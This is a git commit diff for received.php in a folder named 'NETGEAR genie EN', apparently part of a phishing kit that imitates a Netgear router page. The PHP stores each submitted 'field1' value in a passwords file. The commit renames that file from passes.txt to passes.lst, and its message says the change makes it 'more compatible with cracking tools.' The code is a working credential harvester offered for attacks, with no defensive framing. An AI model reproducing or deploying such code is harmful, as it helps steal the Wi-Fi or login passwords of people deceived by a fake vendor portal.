733318c65feec7c8438568d3adb5d87f56726445
x3dnesse <120049043+x3dnesse@users.noreply.github.com>
2022-12-07 13:16:17 -0700

    Passes Fix
    Password file extension changed to lst in order to be more compatible with cracking tools.

--- NETGEAR genie EN/received.php
+++ NETGEAR genie EN/received.php
@@ -1,7 +1,7 @@
 <?php
 if(isset($_POST['field1'])) {
     $data = $_POST['field1'] . "\r\n";
-    $ret = file_put_contents('passes.txt', $data, FILE_APPEND | LOCK_EX);
+    $ret = file_put_contents('passes.lst', $data, FILE_APPEND | LOCK_EX);
     if($ret === false) {
         die('An error has occured');
     }
